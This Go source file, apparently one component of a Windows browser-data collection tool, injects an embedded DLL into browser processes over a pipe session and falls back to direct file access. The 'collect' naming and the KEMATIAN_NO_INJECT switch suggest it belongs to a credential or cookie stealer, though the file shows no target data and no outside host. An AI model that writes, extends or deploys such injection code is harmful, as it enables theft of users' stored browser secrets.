//go:build windows

package recovery

import (
	"os"

	"recovery/recovery/browser"
	"recovery/recovery/platform"
)

func platformSetupCollect() {
	if os.Getenv("KEMATIAN_NO_INJECT") != "" {
		logf("injection disabled via KEMATIAN_NO_INJECT — direct file access only")
		return
	}

	dllBytes := platform.GetEmbeddedDLL()
	if dllBytes != nil {
		for _, cfg := range browser.Browsers {
			logf("attempting DLL injection into %s", cfg.Name)
			session, err := platform.CreatePipeSession(dllBytes, cfg.Name)
			if err != nil {
				logf("inject %s failed: %v", cfg.Name, err)
				continue
			}
			_ = session
			logf("pipe session established with %s", cfg.Name)
			break
		}
	} else {
		logf("no embedded DLL — direct file access only")
	}
}

func platformTeardownCollect() {
	if platform.ActivePipeSession != nil {
		platform.ActivePipeSession.Close()
		platform.ActivePipeSession = nil
	}
}
